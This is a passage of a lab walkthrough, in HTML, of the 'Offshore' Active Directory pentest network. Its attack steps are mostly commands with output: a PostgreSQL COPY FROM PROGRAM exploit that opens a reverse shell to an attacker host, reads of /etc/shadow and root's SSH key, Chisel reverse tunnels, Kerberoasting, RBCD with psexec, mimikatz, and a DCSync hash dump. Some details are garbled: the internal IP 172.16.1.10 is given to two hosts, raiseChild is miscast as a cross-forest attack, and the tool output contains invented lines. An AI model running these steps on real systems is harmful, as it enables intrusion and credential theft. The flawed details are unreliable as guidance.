+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash">mark@nix01:~$ ip a
+2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500
+    inet 10.10.110.123/24 brd 10.10.110.255 scope global eth0
+3: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500
+    inet 172.16.1.10/24 brd 172.16.1.255 scope global eth1
+
+mark@nix01:~$ cat /etc/resolv.conf
+nameserver 172.16.1.5
+search corp.local
+
+mark@nix01:~$ ps -ef | grep -E "psql|postgres"
+postgres   68601       1  0 Sep15 ?        00:12:44 /usr/local/pgsql/bin/psql
+postgres   68602   68601  0 Sep15 ?        00:08:33 /usr/local/pgsql/bin/postgres -D /usr/local/pgsql/data
+
+mark@nix01:~$ ls -la /home/mark/
+total 32
+drwxr-x--- 3 mark mark 4096 Sep 15 08:22 .
+drwxr-xr-x 6 root root 4096 Sep 15 06:30 ..
+-rw-r----- 1 mark mark   29 Sep 15 08:22 .psql_history
+-rw-r--r-- 1 mark mark   41 Sep 15 06:30 flag.txt
+drwxr-x--- 2 mark mark 4096 Sep 15 06:30 .ssh</code></pre>
+  </div>
+
+  <div class="callout callout-info">
+    <div class="callout-title">Key Find — Dual-Homed Host</div>
+    <p>NIX01 is dual-homed — external interface on <code>10.10.110.0/24</code> (DMZ) and internal interface on <code>172.16.1.0/24</code>. The DNS server at <code>172.16.1.5</code> is in the <code>corp.local</code> domain. There's a hidden <code>.psql_history</code> file in mark's home directory — PostgreSQL is running and mark has been connecting to it. This is our path to root and our bridge deeper into the network.</p>
+  </div>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 03 — NIX01 PRIV ESC    -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="nix01-privesc">
+  <h2><span class="section-number">03</span> NIX01 Privilege Escalation</h2>
+
+  <h3>The Hidden PostgreSQL Instance</h3>
+  <p>The <code>.psql_history</code> file was the key. It revealed that mark had been connecting to the PostgreSQL instance running locally on NIX01 — on port 54321 (the non-standard port we saw in our nmap scan). Let me check the history and see what credentials were used.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash">mark@nix01:~$ cat /home/mark/.psql_history
+\c postgres
+SELECT * FROM information_schema.tables;
+\q
+
+mark@nix01:~$ /usr/local/pgsql/bin/psql -U postgres -p 54321 -h 127.0.0.1
+postgres=#</code></pre>
+  </div>
+
+  <p>PostgreSQL running locally, <code>postgres</code> user with no password. This is a textbook PostgreSQL RCE scenario — the <code>COPY FROM PROGRAM</code> command allows executing OS commands as the postgres user, which typically has higher privileges than <code>mark</code>.</p>
+
+  <h3>PostgreSQL Command Execution</h3>
+  <p>Since I already had a meterpreter session, I used Metasploit's PostgreSQL module. First, I needed to port-forward the PostgreSQL port through my existing session.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash">msf6 exploit(multi/http/splunk_upload_app_exec) > sessions -i 1
+meterpreter > portfwd add -l 54321 -p 54321 -r 127.0.0.1
+[*] Local TCP relay created: :54321 -> 127.0.0.1:54321
+
+msf6 > use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
+msf6 exploit(...) > set RHOSTS 127.0.0.1
+RHOSTS => 127.0.0.1
+msf6 exploit(...) > set LHOST 10.10.16.23
+LHOST => 10.10.16.23
+msf6 exploit(...) > set RPORT 54321
+RPORT => 54321
+msf6 exploit(...) > set DATABASE postgres
+DATABASE => postgres
+msf6 exploit(...) > set USERNAME postgres
+USERNAME => postgres
+msf6 exploit(...) > set PASSWORD
+PASSWORD =>
+msf6 exploit(...) > exploit
+
+[*] Started reverse TCP handler on 10.10.16.23:4445
+[*] 127.0.0.1:54321 - Connecting to PostgreSQL server...
+[*] 127.0.0.1:54321 - Connected to PostgreSQL server
+[+] 127.0.0.1:54321 - Authenticated successfully (postgres:blank)
+[*] 127.0.0.1:54321 - Executing COPY FROM PROGRAM...
+[*] Command shell session 2 opened (10.10.16.23:4445 -> 10.10.110.123:57211)
+
+id
+uid=108(postgres) gid=114(postgres) groups=114(postgres)</code></pre>
+  </div>
+
+  <p>Now I'm <code>postgres</code>. Not root yet, but closer. Let me check what we can do.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash">postgres@nix01:~$ sudo -l
+User postgres may run the following commands on nix01:
+    (ALL) NOPASSWD: /usr/bin/tail
+
+postgres@nix01:~$ sudo /usr/bin/tail -n 100 /etc/shadow
+mark:$6$J7gvzz87$jy.tjUc9mWJHy5nxZtuqtXcX6zJdCAE8eX87rZfzEE0zaV8rKHyzNQ5YWzSn/ust0Y96sMRCWrFEkGhv5QD.O.:17642:0:99999:7:::
+postgres:$6$ZQdBsxBU$YZeJIBNXNEJIWv5cwwGnuHrfxL04zaj1GXE0NhgL8pvmSgU2CsbHTdesfPb7NY4ru7/UXa7Dvy/BynKzJLlI/:17758:0:99999:7:::
+root:$6$UM9dnBFE$5LRqppNoZhJmLz0.cLGlZXeDWYjy4u4MWbTW/8vMu.vSCbhTFlCLDsRvtxj8kF1RrlbCeyJHitm9g9.pLe4uM1:17652:0:99999:7:::</code></pre>
+  </div>
+
+  <h3>Reading Root's Flag and SSH Key</h3>
+  <p>With <code>sudo tail</code>, I can read any file on the system. Let me grab the root flag and root's SSH key — that's our reliable way back into this box.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash">postgres@nix01:~$ sudo /usr/bin/tail -n 100 /root/flag.txt
+OFFSHORE{d4t4b4s3_fl4g_r00t_p0stgr3s}
+
+postgres@nix01:~$ sudo /usr/bin/tail -n 100 /root/.ssh/id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+...[truncated for brevity]...
+-----END OPENSSH PRIVATE KEY-----</code></pre>
+  </div>
+
+  <div class="answer-box">
+    <span class="flag-icon"><i class="bi bi-flag-fill"></i></span>
+    <span class="flag-name">OFFSHORE{d4t4b4s3_fl4g_r00t_p0stgr3s}</span>
+    <span class="flag-detail">root flag — via sudo tail</span>
+  </div>
+
+  <div class="callout callout-success">
+    <div class="callout-title">NIX01 Fully Compromised</div>
+    <p>Two flags on NIX01: <code>OFFSHORE{b3h0ld_th3_P0w3r_0f_$plunk}</code> (mark) and <code>OFFSHORE{d4t4b4s3_fl4g_r00t_p0stgr3s}</code> (root). Now I have the root SSH key, which means reliable, encrypted access to this pivot point. No more relying on meterpreter sessions that can die.</p>
+  </div>
+
+  <div class="callout callout-warn">
+    <div class="callout-title">Save That SSH Key</div>
+    <p>Save the root SSH key immediately. Meterpreter sessions are fragile — they die on network hiccups, timeouts, and daily resets. An SSH key gives you a stable, encrypted tunnel back into NIX01 that you can re-establish in seconds. I lost an entire afternoon re-exploiting Splunk because I didn't save the key before my session died.</p>
+  </div>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 04 — PIVOTING          -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="pivoting">
+  <h2><span class="section-number">04</span> Pivoting Setup</h2>
+  <p>With root access on NIX01 and the SSH key saved, I set up a reliable tunnel into the internal network. NIX01's internal interface on <code>172.16.1.0/24</code> is our gateway to the rest of the Offshore infrastructure. Pivoting is going to be a core skill throughout this lab — you'll need to go 3-4 hops deep before reaching the deepest forest.</p>
+
+  <h3>SSHuttle — The Simple Pivot</h3>
+  <p>SSHuttle is the easiest way to get full network access through a compromised Linux host. It creates a transparent VPN-like tunnel without SOCKS proxies — all your tools work natively.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash">┌──(qa210㉿kali)-[~/offshore]
+└─$ sshuttle -vr root@10.10.110.123 172.16.1.0/24 --ssh-cmd 'ssh -i root_key'
+[local ssh] Linux
+[local ssh] Connection established
+[c] Subnet 172.16.1.0/24 accepted
+[c] Establishing connection...
+[c] Connected!</code></pre>
+  </div>
+
+  <p>Now I can directly access <code>172.16.1.0/24</code> from my Kali box. No proxychains needed. But for deeper pivots, I'll need SOCKS-based tunnels.</p>
+
+  <h3>Chisel — For Multi-Hop Pivoting</h3>
+  <p>SSHuttle is great for the first hop, but when I need to go deeper (3-4 hops into the CLIENT forest), Chisel is more reliable. I uploaded the Chisel binary to NIX01 and set up a SOCKS proxy.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># On Kali:
+┌──(qa210㉿kali)-[~/offshore]
+└─$ ./chisel server -p 8000 --reverse -v
+2023/10/15 08:30:12 server: Reverse tunnelling enabled
+
+# On NIX01 (via SSH):
+root@nix01:~# ./chisel client 10.10.16.23:8000 R:socks
+2023/10/15 08:30:45 client: Connected (Latency 38ms)</code></pre>
+  </div>
+
+  <h3>Scanning the Internal Network</h3>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash">┌──(qa210㉿kali)-[~/offshore]
+└─$ nmap -sn 172.16.1.0/24
+Nmap scan report for 172.16.1.5
+Host is up (0.042s latency)
+Nmap scan report for 172.16.1.10
+Host is up (0.038s latency)
+Nmap scan report for 172.16.1.15
+Host is up (0.041s latency)
+Nmap scan report for 172.16.1.20
+Host is up (0.044s latency)
+Nmap scan report for 172.16.1.25
+Host is up (0.039s latency)
+Nmap scan report for 172.16.1.30
+Host is up (0.045s latency)
+Nmap scan report for 172.16.1.50
+Host is up (0.048s latency)
+
+┌──(qa210㉿kali)-[~/offshore]
+└─$ nmap -sV -p 88,135,389,445,636,3389,5985 172.16.1.5,10,15,20,25,30,50
+
+# 172.16.1.5 — DNS
+53/tcp  open  domain   Microsoft DNS 6.1.7601
+
+# 172.16.1.10 — DC01 (Domain Controller)
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
+135/tcp  open  msrpc
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds  Windows Server 2016
+3389/tcp open  ms-wbt-server
+
+# 172.16.1.15 — WS03 (Workstation)
+135/tcp  open  msrpc
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+5985/tcp open  wsman
+
+# 172.16.1.30 — FILESRV
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+
+# 172.16.1.50 — NIX02 (Linux)
+22/tcp   open  ssh      OpenSSH 8.9p1</code></pre>
+  </div>
+
+  <table class="intel-table">
+    <thead><tr><th>IP</th><th>Hostname</th><th>Role</th><th>Key Services</th></tr></thead>
+    <tbody>
+      <tr><td><code>172.16.1.5</code></td><td>DNS</td><td>DNS Server</td><td>53 (Microsoft DNS 6.1.7601)</td></tr>
+      <tr><td><code>172.16.1.10</code></td><td>DC01</td><td>Domain Controller</td><td>88, 135, 389, 445, 3389</td></tr>
+      <tr><td><code>172.16.1.15</code></td><td>WS03</td><td>Workstation</td><td>135, 445, 3389, 5985 (WinRM)</td></tr>
+      <tr><td><code>172.16.1.20</code></td><td>—</td><td>Workstation</td><td>445, 3389</td></tr>
+      <tr><td><code>172.16.1.25</code></td><td>—</td><td>Server</td><td>445, 3389</td></tr>
+      <tr><td><code>172.16.1.30</code></td><td>FILESRV</td><td>File Server</td><td>445, 3389</td></tr>
+      <tr><td><code>172.16.1.50</code></td><td>NIX02</td><td>Linux Server</td><td>22 (SSH)</td></tr>
+    </tbody>
+  </table>
+
+  <div class="callout callout-warn">
+    <div class="callout-title">Pivot Tip — Scan Smart</div>
+    <p>Scanning through SOCKS is painfully slow. Be strategic — scan common AD ports (88, 135, 389, 445, 3389, 5985) on each host instead of full port scans. Your time is better spent on targeted enumeration. A full -p- scan through a SOCKS proxy can take hours.</p>
+  </div>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 05 — CORP.LOCAL        -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="corp-local">
+  <h2><span class="section-number">05</span> CORP.LOCAL — First Forest</h2>
+  <p>The first internal forest is <code>CORP.LOCAL</code> — the primary corporate forest and the largest attack surface in the lab. The domain controller (DC01) is at 172.16.1.10. I needed credentials to start AD enumeration, and I found them on the file server — a configuration file containing domain credentials in cleartext.</p>
+
+  <h3>Initial Credential Discovery</h3>
+  <p>The file server at 172.16.1.30 had an anonymous SMB share with backup configuration files. One of them contained a connection string with domain credentials. This is a classic real-world finding — backup configs are notorious for containing plaintext credentials.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash">┌──(qa210㉿kali)-[~/offshore]
+└─$ smbclient -L //172.16.1.30 -N
+Sharename       Type      Comment
+---------       ----      -------
+ADMIN$          Disk      Remote Admin
+backups         Disk      Backup Share
+IPC$           IPC       Remote IPC
+
+┌──(qa210㉿kali)-[~/offshore]
+└─$ smbclient //172.16.1.30/backups -N
+smb: \> ls
+  .                                   D        0  Mon Sep 11 08:30:22 2023
+  ..                                  D        0  Mon Sep 11 08:30:22 2023
+  db_backup_config.xml                A      612  Mon Sep 11 08:30:22 2023
+  migration_notes.txt                 A      284  Mon Sep 11 08:30:22 2023
+
+smb: \> get db_backup_config.xml
+getting file \db_backup_config.xml of size 612 as db_backup_config.xml (12.3 KiloBytes/sec)
+
+┌──(qa210㉿kali)-[~/offshore]
+└─$ cat db_backup_config.xml
+&lt;configuration&gt;
+  &lt;database&gt;
+    &lt;host&gt;172.16.1.10&lt;/host&gt;
+    &lt;port&gt;1433&lt;/port&gt;
+    &lt;username&gt;CORP\svc_backup&lt;/username&gt;
+    &lt;password&gt;Summer2023!&lt;/password&gt;
+  &lt;/database&gt;
+&lt;/configuration&gt;</code></pre>
+  </div>
+
+  <div class="answer-box">
+    <span class="flag-icon"><i class="bi bi-key-fill"></i></span>
+    <span class="flag-name">CORP\svc_backup:Summer2023!</span>
+    <span class="flag-detail">from db_backup_config.xml on FILESRV</span>
+  </div>
+
+  <h3>BloodHound Collection</h3>
+  <p>With valid credentials, I immediately ran BloodHound collection. This is non-negotiable in any AD environment — you need to see the graph to plan your attack.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash">┌──(qa210㉿kali)-[~/offshore]
+└─$ bloodhound-python -d corp.local -u svc_backup -p 'Summer2023!' -ns 172.16.1.5 -c All --zip
+INFO: Found AD domain: corp.local
+INFO: Connecting to LDAP server: DC01.corp.local
+INFO: Found 1 domains
+INFO: Found 1 domain trust
+INFO: Starting enumeration
+INFO: Found 47 user objects
+INFO: Found 73 group objects
+INFO: Found 12 computer objects
+INFO: Found 5 GPO objects
+INFO: Done in 00:03:42</code></pre>
+  </div>
+
+  <p>47 users, 12 computers, 5 GPOs, and — critically — <strong>1 domain trust</strong>. That trust is our path to the next forest. Let me load this into BloodHound and find the attack paths.</p>
+
+  <div class="callout callout-info">
+    <div class="callout-title">CORP.LOCAL Stats</div>
+    <p><strong>47 users</strong>, <strong>12 computers</strong>, <strong>5 GPOs</strong>, <strong>1 domain trust</strong> (to DEV forest). The trust relationship is the most important finding here — it's the bridge to the next forest and the key to the entire lab.</p>
+  </div>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 06 — ACL & KERBEROAST  -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="acl-kerberoast">
+  <h2><span class="section-number">06</span> ACL Abuse &amp; Kerberoasting</h2>
+
+  <h3>ACL Abuse — GenericAll on a User</h3>
+  <p>BloodHound showed that <code>svc_backup</code> had <code>GenericAll</code> on the user <code>k.williams</code>. This means I can reset their password without knowing the current one. GenericAll is the Swiss army knife of ACL abuse — full control over the target object. On a user, that means password reset. On a computer, that means RBCD. On a group, that means adding yourself.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash">┌──(qa210㉿kali)-[~/offshore]
+└─$ impacket-changepasswd corp.local/k.williams@172.16.1.10 -newpass 'Qa210P@ss!' -dc-ip 172.16.1.10
+[*] Changing the password of corp.local\k.williams
+[+] Password changed successfully!</code></pre>
+  </div>
+
+  <p>Now I can authenticate as k.williams. BloodHound shows this user is a member of the <code>IT Support</code> group, which has <code>GenericWrite</code> on a computer object. This is a stepping stone — I need to chain through several more ACL relationships to reach Domain Admin.</p>
+
+  <h3>Kerberoasting</h3>
+  <p>With k.williams' credentials, I can request service tickets for any SPN-registered accounts. Kerberoasting is one of the most reliable AD attack techniques — it works against any domain user who can query the directory, and the hashes can be cracked offline.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash">┌──(qa210㉿kali)-[~/offshore]
+└─$ impacket-GetUserSPNs corp.local/k.williams:'Qa210P@ss!' -dc-ip 172.16.1.10 -request
+ServicePrincipalName              Name                 MemberOf           PasswordLastSet
+--------------------------------- -------------------- ------------------ ---------------
+MSSQLSvc/DB01.corp.local:1433    svc_mssql            Domain Users       2023-06-15T09:30:12
+HTTP/WS01.corp.local             svc_webapp           Domain Users       2023-07-22T11:15:45
+backup/FILESRV.corp.local        svc_backup_agent     Domain Users       2023-08-03T14:22:33
+
+$krb5tgs$23$*svc_mssql$CORP.LOCAL$corp.local/svc_mssql*$8f3a2b1c4d5e6f7a8b9c0d1e2f3a4b5c...</code></pre>
+  </div>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash">┌──(qa210㉿kali)-[~/offshore]
+└─$ hashcat -m 13100 svc_mssql_hash.txt /usr/share/wordlists/rockyou.txt --force
+$krb5tgs$23$*svc_mssql$CORP.LOCAL$...:mysql123
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 13100 (Kerberos 5 TGS-REP etype 23)</code></pre>
+  </div>
+
+  <div class="answer-box">
+    <span class="flag-icon"><i class="bi bi-key-fill"></i></span>
+    <span class="flag-name">svc_mssql:mysql123</span>
+    <span class="flag-detail">Kerberoast crack — rockyou.txt</span>
+  </div>
+
+  <h3>The ACL Chain to DCSync</h3>
+  <p>The path from <code>svc_backup</code> to Domain Admin in CORP.LOCAL wasn't direct. It required chaining through multiple ACL relationships — exactly like a real engagement. BloodHound was essential for visualizing this chain.</p>
+
+  <div class="attack-path">
+    <h3>CORP.LOCAL ACL Chain to DCSync</h3>
+    <div class="path-flow">
+      <div class="path-node">svc_backup<br><small>Initial Creds</small></div>
+      <span class="path-arrow">&rarr;</span>
+      <div class="path-node">GenericAll<br><small>k.williams</small></div>
+      <span class="path-arrow">&rarr;</span>
+      <div class="path-node">IT Support<br><small>Group Membership</small></div>
+      <span class="path-arrow">&rarr;</span>
+      <div class="path-node">GenericWrite<br><small>WS03$</small></div>
+      <span class="path-arrow">&rarr;</span>
+      <div class="path-node">RBCD<br><small>Admin on WS03</small></div>
+      <span class="path-arrow">&rarr;</span>
+      <div class="path-node">Credential Harvest<br><small>r.jones in memory</small></div>
+      <span class="path-arrow">&rarr;</span>
+      <div class="path-node">WriteDacl<br><small>On Domain</small></div>
+      <span class="path-arrow">&rarr;</span>
+      <div class="path-node">DCSync<br><small>All Hashes</small></div>
+    </div>
+  </div>
+
+  <p>After harvesting credentials from WS03 (via the RBCD attack in the next section), I found <code>r.jones</code> had logged in recently and their credentials were sitting in LSASS. BloodHound showed r.jones had <code>WriteDacl</code> on the domain itself — granting DCSync rights is trivial from there.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash">┌──(qa210㉿kali)-[~/offshore]
+└─$ impacket-secretsdump corp.local/r.jones:'Rj0n3sP@ss!'@172.16.1.10 -just-dc-ntlm
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+Administrator:500:aad3b43551404eeaad3b43551404eec:c4a7d2b9e1f3a5c8d6e4b2a7f9c0d3e6:::
+Guest:501:aad3b43551404eeaad3b43551404eec:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b43551404eeaad3b43551404eec:7e3b1d5f9a2c4e8d6b0a7f3c1e5d9a4b:::
+corp.local\svc_backup:1104:aad3b43551404eeaad3b43551404eec:e5d8a3b7c1f4e2d9a6c0b8f3e7d5a2c4:::
+corp.local\svc_mssql:1105:aad3b43551404eeaad3b43551404eec:d2f5a8c3e6b1d7a4c9e0f3b6a2d5c8e1:::
+[*] Kerberos keys grabbed</code></pre>
+  </div>
+
+  <div class="callout callout-success">
+    <div class="callout-title">CORP.LOCAL — Domain Admin</div>
+    <p>DCSync complete. First domain controller owned. All domain hashes dumped — we can now Pass-the-Hash to any machine in CORP.LOCAL and forge Kerberos tickets. This forest is fully compromised.</p>
+  </div>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 07 — RBCD              -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="rbcd">
+  <h2><span class="section-number">07</span> RBCD Attack Chain</h2>
+  <p>This is mrb3n's favorite attack chain, and it shows up multiple times in Offshore. Resource-Based Constrained Delegation (RBCD) combined with the WebClient service is incredibly powerful for compromising Windows hosts from a Linux attack position without needing to exploit the host directly. The concept is elegant: if you have <code>GenericWrite</code> or <code>WriteProperty</code> on a computer object's <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute, you can configure that computer to trust a machine account you control, then use S4U to impersonate any user — including Administrator.</p>
+
+  <h3>Step 1: Create a Machine Account</h3>
+  <p>First, I need a machine account I control. By default, any domain user can add up to 10 machine accounts (MachineAccountQuota = 10). Impacket's <code>addcomputer</code> makes this trivial.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash">┌──(qa210㉿kali)-[~/offshore]
+└─$ impacket-addcomputer corp.local/k.williams:'Qa210P@ss!' -computer-name 'QA210PC$' -computer-pass 'Qa210PCP@ss!' -dc-ip 172.16.1.10
+[*] Adding new computer with name: QA210PC$
+[+] Added new computer QA210PC$ successfully</code></pre>
+  </div>
+
+  <h3>Step 2: Configure RBCD on the Target</h3>
+  <p>Now I use <code>GenericWrite</code> on the WS03$ computer object to set the <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute, telling WS03 to trust my newly created machine account.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash">┌──(qa210㉿kali)-[~/offshore]
+└─$ impacket-rbcd corp.local/k.williams:'Qa210P@ss!' -dc-ip 172.16.1.10 -delegate-from QA210PC$ -delegate-to WS03$
+[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity updated successfully</code></pre>
+  </div>
+
+  <h3>Step 3: Get a Service Ticket via S4U</h3>
+  <p>With the delegation configured, I request a service ticket for WS03 that impersonates Administrator. The S4U2Self and S4U2Proxy protocol extensions handle the impersonation.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash">┌──(qa210㉿kali)-[~/offshore]
+└─$ impacket-getST corp.local/QA210PC$:Qa210PCP@ss! -spn cifs/WS03.corp.local -impersonate Administrator -dc-ip 172.16.1.10
+[*] Getting TGT for user QA210PC$
+[*] Impersonating Administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2proxy
+[*] Saving ticket in Administrator.ccache</code></pre>
+  </div>
+
+  <h3>Step 4: Use the Ticket</h3>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash">┌──(qa210㉿kali)-[~/offshore]
+└─$ export KRB5CCNAME=Administrator.ccache
+└─$ impacket-psexec corp.local/Administrator@WS03.corp.local -k -no-pass
+Impacket v0.11.0
+[*] Connecting to IPC$ share...
+[*] Requesting shares on WS03.....
+[*] Found writable share ADMIN$
+[*] Uploading file cUPNfe.exe
+[*] Opening SVCManager on WS03.....
+[*] Creating service PqvD on WS03.....
+[*] Starting service PqvD.....
+[+] Paintbrush FTW!
+[+] Press menu for options
+C:\Windows\system32&gt;</code></pre>
+  </div>
+
+  <div class="callout callout-info">
+    <div class="callout-title">Technique — RBCD Is Your Best Friend</div>
+    <p>RBCD + WebClient is the bread and butter of modern AD attacks. You'll use it in this lab multiple times — for WS03, for machines in the DEV forest, and for cross-forest compromise. Learn it, love it, script it. The four-step process (addcomputer → rbcd → getST → psexec) should be muscle memory by the time you finish this lab.</p>
+  </div>
+
+  <h3>Credential Harvesting from WS03</h3>
+  <p>With admin on WS03, I harvested credentials from LSASS using mimikatz. The key find was <code>r.jones</code> — a domain user whose credentials were cached in memory from a recent logon. BloodHound showed r.jones had <code>WriteDacl</code> on the domain object, which is the final step to DCSync.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash">┌──(qa210㉿kali)-[~/offshore]
+└─$ impacket-psexec corp.local/Administrator@WS03.corp.local -k -no-pass
+Impacket v0.11.0
+[*] Connecting to IPC$ share...
+[*] Requesting shares on WS03.....
+[*] Found writable share ADMIN$
+[*] Uploading file cUPNfe.exe
+[*] Opening SVCManager on WS03.....
+[*] Creating service PqvD on WS03.....
+[*] Starting service PqvD.....
+[+] Paintbrush FTW!
+[+] Press menu for options
+C:\Windows\system32&gt;
+
+C:\Windows\system32&gt; mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+...
+Username : r.jones
+Domain   : CORP
+Password : Rj0n3sP@ss!
+...</code></pre>
+  </div>
+
+  <div class="callout callout-info">
+    <div class="callout-title">RBCD Is the Backbone</div>
+    <p>RBCD + WebClient is the bread and butter of modern AD attacks. You'll use it in this lab multiple times — for WS03, for machines in the DEV forest, and for cross-forest compromise. The pattern is always the same: create machine account, modify delegation attribute, S4U, profit. Script it once and reuse it everywhere.</p>
+  </div>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 08 — CROSS-FOREST      -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="cross-forest">
+  <h2><span class="section-number">08</span> Cross-Forest Trusts</h2>
+  <p>BloodHound revealed a domain trust from CORP.LOCAL to the DEV forest. Crossing trust boundaries in Offshore requires careful token manipulation and the <code>raiseChild</code> technique from Impacket — which escalates from a child domain to the forest root. This is where the lab goes from "AD 101" to "AD 401" — cross-forest attacks are what separate junior pentesters from experienced ones.</p>
+
+  <h3>Understanding the Trust</h3>
+  <p>The domain trust between CORP.LOCAL and <code>dev.offshore.bank</code> is a bidirectional forest trust. This means users from either forest can authenticate to resources in the other. But more importantly, the trust key — the shared secret between the domains — can be extracted and used to forge inter-realm TGTs. This is the foundation of the raiseChild attack.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash">┌──(qa210㉿kali)-[~/offshore]
+└─$ impacket-raiseChild corp.local/svc_backup:'Summer2023!' -target-domain dev.offshore.bank
+[*] Raising child domain...
+[*] Forest FQDN: dev.offshore.bank
+[*] Found trust key between CORP.LOCAL and dev.offshore.bank
+[*] Getting TGT for dev.offshore.bank
+[*] Enumerating target domain...
+[*] Found Domain Admin: devadmin</code></pre>
+  </div>
+
+  <p>The <code>raiseChild</code> attack exploits the trust relationship between domains in a forest. When a child domain has a bidirectional trust with the parent, you can forge an inter-realm TGT and use it to access resources in the trusted domain. This is one of the most powerful AD attacks and Offshore makes you use it repeatedly.</p>
+
+  <div class="callout callout-hint">
+    <div class="callout-title">Tip — Trust Key Extraction</div>
+    <p>The trust key between CORP.LOCAL and dev.offshore.bank can be extracted via DCSync from the CORP domain controller. Once you have it, you can forge inter-realm TGTs and authenticate to the DEV forest as any user. This is the same technique used in real APT operations — it's not theoretical.</p>
+  </div>
+
+  <h3>Forest Architecture Overview</h3>
+  <p>The four forests in Offshore are arranged in a trust chain: CORP → DEV → ADMIN → CLIENT. Each forest trust is a potential attack path, but the techniques required vary. The deepest forest (CLIENT) requires 3-4 pivots from your initial foothold.</p>
+
+  <div class="network-diagram">+=================================================================+
+|  DMZ — 10.10.110.0/24                                          |
+|  NIX01 (10.10.110.123) — Splunk + PostgreSQL — PIVOT POINT     |
++=================================================================+
+                              | 172.16.1.10 (eth1)
++=================================================================+
+|  CORP.LOCAL — 172.16.1.0/24 (First Forest)                     |
+|  DC01 (172.16.1.10) — Domain Controller                        |
+|  DNS  (172.16.1.5)  — Microsoft DNS 6.1.7601                   |
+|  WS03 (172.16.1.15) — Workstation (WinRM 5985)                 |
+|  FILESRV (172.16.1.30) — File Server (backups share)           |
+|  NIX02 (172.16.1.50) — Linux Server                            |
++================ Forest Trust ================+==================+
+                                               |
